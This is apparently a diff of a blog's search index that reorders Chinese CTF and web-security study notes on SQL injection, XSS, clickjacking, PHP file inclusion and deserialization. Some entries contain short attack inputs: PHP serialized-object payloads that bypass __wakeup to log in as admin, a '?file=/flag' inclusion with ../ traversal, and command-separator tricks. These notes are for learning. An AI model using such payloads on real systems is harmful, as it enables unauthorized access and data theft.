使用$*和$@，<span class="variable">$x</span>(x 代表 <span class="number">1</span>-<span class="number">9</span>),$&#123;x&#125;(x&gt;=<span class="number">10</span>)(小于 <span class="number">10</span> 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>‍</p>
 ]]></content>
@@ -2132,11 +2132,6 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/</url>
-    <content><![CDATA[<h1 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h1><h1 id="PHP安全-1"><a href="#PHP安全-1" class="headerlink" title="PHP安全"></a>PHP安全</h1>]]></content>
-  </entry>
-  <entry>
-    <title></title>
     <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h1 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入"></a>SQL注入</h1><h1 id="一，概述"><a href="#一，概述" class="headerlink" title="一，概述"></a>一，概述</h1><p>SQL注入（SQL Injection）是一种常见的安全漏洞，它允许攻击者通过在应用程序的输入字段中插入恶意的SQL代码来执行非法的数据库操作。这种漏洞通常出现在使用动态生成SQL查询的应用程序中，而不是正确地使用参数化查询或预编译语句。</p>
 <p>攻击者可以通过输入恶意的SQL语句来利用SQL注入漏洞。这些语句可以绕过应用程序的输入验证，直接与后端数据库进行交互。攻击者可以通过注入恶意代码来执行各种操作，如绕过身份验证、访问、修改或删除敏感数据，甚至完全控制数据库服务器。</p>
@@ -2371,6 +2366,11 @@
   </entry>
   <entry>
     <title></title>
+    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<h1 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h1><h1 id="PHP安全-1"><a href="#PHP安全-1" class="headerlink" title="PHP安全"></a>PHP安全</h1>]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/</url>
     <content><![CDATA[<h1 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h1><h1 id="SQL注入万能密码-1"><a href="#SQL注入万能密码-1" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h1><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">https://blog.csdn.net/hxhxhxhxx/article/details/108020010</a></p>
 <h1 id="万能密码原理"><a href="#万能密码原理" class="headerlink" title="万能密码原理"></a>万能密码原理</h1><p>原验证登陆语句:</p>
@@ -2453,24 +2453,6 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2023/10/23/XSS/XSS%E8%A0%95%E8%99%AB/</url>
-    <content><![CDATA[<h1 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h1><p>​<img src="/assets/image-20231008085345-irh2721.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008085414-6fpgnf1.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008085437-2acgt00.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008085552-9bx8evk.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008085640-i3fi7xw.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008090817-ye33kwg.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008090904-r4pl1p1.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008091008-0k323st.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008091258-1mxj1ij.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008091319-fyezc19.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231008091350-4prenme.png" alt="image">​</p>
-<p>‍</p>
-<p>‍</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
     <url>/2023/10/23/WEB/%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
     <content><![CDATA[<h1 id="源代码泄露"><a href="#源代码泄露" class="headerlink" title="源代码泄露"></a>源代码泄露</h1><h1 id="源代码泄露-1"><a href="#源代码泄露-1" class="headerlink" title="源代码泄露"></a>源代码泄露</h1><p>对网站的渗透过程中，由于网站管理人员的疏忽或网站配置不当会使一些本应该隐藏的目录及文件暴露到公网上，如网站备份、带有账号密码的网站说明等，还有些网站的后台路径名非常容易被攻击者猜解到，这些都对网站的安全性造成极大的威胁。</p>
 <h1 id="1-文件搜集"><a href="#1-文件搜集" class="headerlink" title="1.文件搜集"></a>1.文件搜集</h1><p>搜索网站</p>
@@ -2521,8 +2503,44 @@
   </entry>
   <entry>
     <title></title>
+    <url>/2023/10/23/XSS/XSS%E8%A0%95%E8%99%AB/</url>
+    <content><![CDATA[<h1 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h1><p>​<img src="/assets/image-20231008085345-irh2721.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008085414-6fpgnf1.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008085437-2acgt00.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008085552-9bx8evk.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008085640-i3fi7xw.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008090817-ye33kwg.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008090904-r4pl1p1.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008091008-0k323st.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008091258-1mxj1ij.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008091319-fyezc19.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231008091350-4prenme.png" alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>/2023/10/23/WP/Untitled/</url>
     <content><![CDATA[<h1 id="Untitled"><a href="#Untitled" class="headerlink" title="Untitled"></a>Untitled</h1><p>‍</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/23/XSS/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/</url>
+    <content><![CDATA[<h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><p>​<img src="/assets/image-20231020192854-4pzhwnw.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020193001-ye60n9h.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020193018-8u0qeta.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020193048-39xnvu1.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020193115-n83ww65.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020193132-x4pr73u.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020193213-wxabrrt.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020194858-7iw2vl1.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020194941-q7y1gq1.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020194951-jb70ln2.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020195017-geotvoy.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231020195704-nltcvjy.png" alt="image">​</p>
+<p>‍</p>
 ]]></content>
   </entry>
   <entry>
@@ -2561,24 +2579,6 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2023/10/23/XSS/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/</url>
-    <content><![CDATA[<h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><p>​<img src="/assets/image-20231020192854-4pzhwnw.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020193001-ye60n9h.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020193018-8u0qeta.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020193048-39xnvu1.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020193115-n83ww65.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020193132-x4pr73u.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020193213-wxabrrt.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020194858-7iw2vl1.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020194941-q7y1gq1.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020194951-jb70ln2.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020195017-geotvoy.png" alt="image">​</p>
-<p>​<img src="/assets/image-20231020195704-nltcvjy.png" alt="image">​</p>
-<p>‍</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
     <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h1><p>‍</p>
 <p>‍</p>
@@ -2588,18 +2588,6 @@
     <title></title>
     <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP__toString%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[<h1 id="PHP-toString反序列化利用"><a href="#PHP-toString反序列化利用" class="headerlink" title="PHP__toString反序列化利用"></a>PHP__toString反序列化利用</h1><p>‍</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/private%E5%8F%98%E9%87%8F/</url>
-    <content><![CDATA[<h1 id="private变量"><a href="#private变量" class="headerlink" title="private变量"></a>private变量</h1><p>这个变量是private。</p>
-<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字。</p>
-<p>段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。</p>
-<p>于是我们在构造一回pyload:</p>
-<p>?select&#x3D;O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
-<p>​<img src="/assets/image-20231023100858-dd0i0w7.png" alt="image">​</p>
-<p>‍</p>
 ]]></content>
   </entry>
   <entry>
@@ -2620,6 +2608,18 @@
 <p>在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()，去执行__destruct</p>
 <p>于是我们这样构造pyload:</p>
 <p>?select&#x3D;O:4:&quot;Name&quot;:3:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</p>
+<p>‍</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/private%E5%8F%98%E9%87%8F/</url>
+    <content><![CDATA[<h1 id="private变量"><a href="#private变量" class="headerlink" title="private变量"></a>private变量</h1><p>这个变量是private。</p>
+<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字。</p>
+<p>段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。</p>
+<p>于是我们在构造一回pyload:</p>
+<p>?select&#x3D;O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
+<p>​<img src="/assets/image-20231023100858-dd0i0w7.png" alt="image">​</p>
 <p>‍</p>
 ]]></content>
   </entry>
@@ -2687,57 +2687,6 @@
 <p>2.传递多个参数之间应当检测数据的一致性</p>
 <p>‍</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/assets/</url>
-    <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h1 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h1><h1 id="一，概述"><a href="#一，概述" class="headerlink" title="一，概述"></a>一，概述</h1><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被成为文件包含。其中PHP的文件包含是通过include()、require()、include_once()和require_once()四个函数实现的。</p>
-<table>
-<thead>
-<tr>
-<th>函 数</th>
-<th>包含失败</th>
-<th>特点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>include()</td>
-<td>返回一条警告</td>
-<td>报错也会继续运行</td>
-</tr>
-<tr>
-<td>require()</td>
-<td>强行中断</td>
-<td>代码在报错处不再运行</td>
-</tr>
-<tr>
-<td>include_once()</td>
-<td>返回一条警告</td>
-<td>除了原有include()功能，还会做once检测，如果文件曾经已经被包含过，不在包含</td>
-</tr>
-<tr>
-<td>require_once()</td>
-<td>强行中断</td>
-<td>除了原有require()功能，还会做once检测,防止文件反复包含<br /></td>
-</tr>
-</tbody></table>
-<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p><img src="/assets/image-20230611162932-h57hl9f.png" alt="image.png"></p>
-<p><img src="/assets/image-20230611162938-tdwrth7.png" alt="image.png"></p>
-<h1 id="例题：buuctf-BUU-LFI-COURSE-1"><a href="#例题：buuctf-BUU-LFI-COURSE-1" class="headerlink" title="例题：buuctf: BUU LFI COURSE 1"></a>例题：buuctf: BUU LFI COURSE 1</h1><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。在本题的PHP代码中即可看到include函数<br>因为文件路径可控，当输入系统的密码文件所在路径时，内容会输出出来<br>在url后构造</p>
-<blockquote>
-<p>?file&#x3D;&#x2F;flag</p>
-</blockquote>
-<p><img src="/assets/image-20230611223332-x57am5z.png" alt="image.png"></p>
-<h3 id="还可以加一些不存在的目录名，进行穿越、绕过"><a href="#还可以加一些不存在的目录名，进行穿越、绕过" class="headerlink" title="还可以加一些不存在的目录名，进行穿越、绕过"></a>还可以加一些不存在的目录名，进行穿越、绕过</h3><p>加入一个不存在的目录名，然后利用..&#x2F;返回上级目录继续操作即可。</p>
-<hr>
-<p><img src="/assets/image-20230611223826-wjcu8mv.png" alt="image.png"></p>
-<h2 id="通过php-查看源代码"><a href="#通过php-查看源代码" class="headerlink" title="通过php:&#x2F;&#x2F;查看源代码"></a>通过php:&#x2F;&#x2F;查看源代码</h2><h2 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;<img src="/"></h2><h2 id="php-data"><a href="#php-data" class="headerlink" title="php:data:&#x2F;&#x2F;"></a>php:data:&#x2F;&#x2F;</h2>]]></content>
   </entry>
   <entry>
     <title></title>
@@ -2815,6 +2764,57 @@
 <p>得到flag。</p>
 <p>经验：</p>
 <p>多次尝试不同方式的字符绕过，以及连接符（比如：|或;或者&amp;&amp;）。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h1 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h1><h1 id="一，概述"><a href="#一，概述" class="headerlink" title="一，概述"></a>一，概述</h1><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被成为文件包含。其中PHP的文件包含是通过include()、require()、include_once()和require_once()四个函数实现的。</p>
+<table>
+<thead>
+<tr>
+<th>函 数</th>
+<th>包含失败</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>include()</td>
+<td>返回一条警告</td>
+<td>报错也会继续运行</td>
+</tr>
+<tr>
+<td>require()</td>
+<td>强行中断</td>
+<td>代码在报错处不再运行</td>
+</tr>
+<tr>
+<td>include_once()</td>
+<td>返回一条警告</td>
+<td>除了原有include()功能，还会做once检测，如果文件曾经已经被包含过，不在包含</td>
+</tr>
+<tr>
+<td>require_once()</td>
+<td>强行中断</td>
+<td>除了原有require()功能，还会做once检测,防止文件反复包含<br /></td>
+</tr>
+</tbody></table>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p><img src="/assets/image-20230611162932-h57hl9f.png" alt="image.png"></p>
+<p><img src="/assets/image-20230611162938-tdwrth7.png" alt="image.png"></p>
+<h1 id="例题：buuctf-BUU-LFI-COURSE-1"><a href="#例题：buuctf-BUU-LFI-COURSE-1" class="headerlink" title="例题：buuctf: BUU LFI COURSE 1"></a>例题：buuctf: BUU LFI COURSE 1</h1><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。在本题的PHP代码中即可看到include函数<br>因为文件路径可控，当输入系统的密码文件所在路径时，内容会输出出来<br>在url后构造</p>
+<blockquote>
+<p>?file&#x3D;&#x2F;flag</p>
+</blockquote>
+<p><img src="/assets/image-20230611223332-x57am5z.png" alt="image.png"></p>
+<h3 id="还可以加一些不存在的目录名，进行穿越、绕过"><a href="#还可以加一些不存在的目录名，进行穿越、绕过" class="headerlink" title="还可以加一些不存在的目录名，进行穿越、绕过"></a>还可以加一些不存在的目录名，进行穿越、绕过</h3><p>加入一个不存在的目录名，然后利用..&#x2F;返回上级目录继续操作即可。</p>
+<hr>
+<p><img src="/assets/image-20230611223826-wjcu8mv.png" alt="image.png"></p>
+<h2 id="通过php-查看源代码"><a href="#通过php-查看源代码" class="headerlink" title="通过php:&#x2F;&#x2F;查看源代码"></a>通过php:&#x2F;&#x2F;查看源代码</h2><h2 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;<img src="/"></h2><h2 id="php-data"><a href="#php-data" class="headerlink" title="php:data:&#x2F;&#x2F;"></a>php:data:&#x2F;&#x2F;</h2>]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/assets/</url>
+    <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
 ]]></content>
   </entry>
   <entry>
